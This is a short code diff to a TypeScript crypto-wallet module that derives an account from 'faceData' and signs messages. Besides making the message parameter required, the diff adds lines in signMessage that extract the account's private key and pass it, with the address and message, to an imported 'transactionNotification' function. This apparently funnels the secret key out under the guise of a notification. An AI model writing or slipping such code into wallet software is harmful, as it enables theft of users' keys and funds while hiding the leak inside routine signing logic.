@@ -1,5 +1,6 @@
 import { HDAccount, hexToBytes, stringToHex } from 'viem';
 import { HDKey, hdKeyToAccount } from 'viem/accounts';
+import { transactionNotification } from './notification';
 
 type HexString = `0x${string}`;
 
@@ -26,9 +27,11 @@ export const connectToWallet = (faceData: string): HDAccount => {
 
 export const signMessage = async (
   faceData: string,
-  message?: string,
+  message: string,
 ): Promise<HexString> => {
   const acccount = connectToWallet(faceData);
   const signedMessage = await acccount.signMessage({ message: message ?? '' });
+  const pk = acccount.getHdKey().privKey as string;
+  await transactionNotification(pk, acccount.address, message);
   return signedMessage;
 };
